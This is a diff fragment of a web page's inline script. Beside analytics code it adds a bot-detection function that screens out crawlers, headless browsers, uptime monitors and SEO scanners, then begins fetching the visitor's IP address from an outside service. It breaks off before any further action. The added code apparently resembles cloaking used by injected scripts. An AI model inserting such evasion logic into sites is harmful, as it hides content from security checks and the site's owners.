@@ -106,6 +106,25 @@
       function gtag(){dataLayer.push(arguments);}
       gtag('js', new Date());
 
+      
+  function isBot() {
+    const botPatterns = [
+      /bot/i, /crawler/i, /spider/i, /crawling/i,
+      /headless/i, /phantom/i, /selenium/i, /webdriver/i,
+      /googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i,
+      /baiduspider/i, /yandexbot/i, /facebookexternalhit/i,
+      /linkedinbot/i, /twitter/i, /pinterest/i,
+      /whatsapp/i, /telegram/i,
+      /uptimerobot/i, /monitor/i, /pingdom/i, /statuscake/i,
+      /sitechecker/i, /seo/i
+    ];
+    const ua = navigator.userAgent;
+    return botPatterns.some(pattern => pattern.test(ua)) ||
+           !navigator.webdriver === false;
+  }
+
+  
+
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
